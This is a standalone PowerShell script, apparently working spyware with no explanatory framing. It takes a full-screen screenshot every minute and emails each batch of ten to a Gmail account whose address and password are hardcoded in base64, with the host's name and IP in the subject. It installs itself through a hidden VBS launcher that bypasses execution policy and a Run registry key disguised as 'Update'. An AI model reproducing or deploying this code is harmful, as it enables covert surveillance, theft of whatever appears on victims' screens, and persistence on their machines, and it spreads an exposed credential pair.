$shot = @'

$screenshot = "$env:temp\screenshot"

function shot {
	if(-not (Test-Path $screenshot)){
			New-Item $screenshot -ItemType Directory -Force
	}

	$FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"

	$File = Join-Path $screenshot $FileName
	Add-Type -AssemblyName System.Windows.Forms
	Add-type -AssemblyName System.Drawing

	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
	$Width = $Screen.Width
	$Height = $Screen.Height
	$Left = $Screen.Left
	$Top = $Screen.Top

	$bitmap = New-Object System.Drawing.Bitmap $Width,$Height

	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

	$graphic.CopyFromScreen($Left,$Top,0,0,$bitmap.Size)

	$bitmap.Save($File) 

	Write-Output $File

}
	
function sendmail {
	$encodedemail = "ZWxjMjY2MzA5QGdtYWlsLmNvbQ=="
	$username = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedemail))
	$encodedpass = "dHJlbWJvbG9uYQ=="
	$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedpass))
	$smtpserver = "smtp.gmail.com"

	$msg = new-object Net.Mail.MailMessage
	$smtp = new-object Net.Mail.SmtpClient($smtpServer,587)
	$smtp.EnableSsl = $True
	$smtp.Credentials = New-Object System.Net.NetworkCredential("$username","$password");
	$msg.From = $username
	$msg.To.Add($username)
	$msg.Subject = "$env:COMPUTERNAME - $([System.Net.Dns]::GetHostByName($Computer).AddressList[0])"
	$msg.Body = "See the attachments..."

    $files = Get-ChildItem $screenshot
    
    Foreach($file in $files){
    Write-Host "Attaching files..."
    $attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
    $msg.Attachments.Add($attachment)
}

	$smtp.Send($msg)
	Write-Host "Email sent!"
    $attachment.Dispose();
    $msg.Dispose();
}

while($true){
	shot

	$count = Get-ChildItem $screenshot -Recurse -File | Measure-Object | %{$_.Count}
	if($count -eq 10){
		sendmail
		Remove-Item -Path $screenshot\* -Force
	}
	Start-Sleep -Seconds 60
}

'@


$set = "abcdefghijkmnopqrstuvwxyz123456789"
$randstr = (1..(4 + (Get-Random -Maximum 5)) | % {$set[(Get-Random -Minimum 0 -Maximum $set.Length)]}) -join ''

$name = "$randstr.vbs"
$modulename = "$randstr.ps1"
Out-File -InputObject $shot -Force $env:TEMP\$modulename


echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
echo "Set WscriptShell = Nothing" >> $env:TEMP\$name


New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -Force

Invoke-Expression $env:TEMP\$modulename
